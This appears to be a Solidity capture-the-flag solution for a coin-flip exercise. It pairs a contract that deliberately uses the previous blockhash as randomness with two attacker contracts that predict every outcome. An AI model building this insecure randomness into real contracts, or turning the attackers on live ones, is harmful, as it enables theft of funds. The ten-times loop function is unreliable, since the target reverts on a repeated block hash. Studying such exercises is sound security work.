// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}

/// @custom:dev-run-script ./scripts/hackCoinFlipRun.ts
contract hackCoinFlip {
    address public originalContract = 0x5CF397577C74b41265fbD2DCC29536ECb3A55Ba2;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function hackAndSlash() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        require(CoinFlip(originalContract).flip(side), "Wrong Guess");      
    }

    function runHackAndSlashTenTimes() public {
        for (uint256 i = 0; i < 10; i++) {
            hackAndSlash();
        }
    }
}

// interface ICoinFlip {
//     function consecutiveWins() external view returns (uint256);
//     function flip(bool) external returns (bool);
// }

contract Hack {
    CoinFlip private immutable target;
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = CoinFlip(_target);
    }

    // call this function 10 times
    function flip() external {
        bool guess = _guess();
        require(target.flip(guess), "guess failed");
    }

    function _guess() private view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        return coinFlip == 1 ? true : false;
    }
}
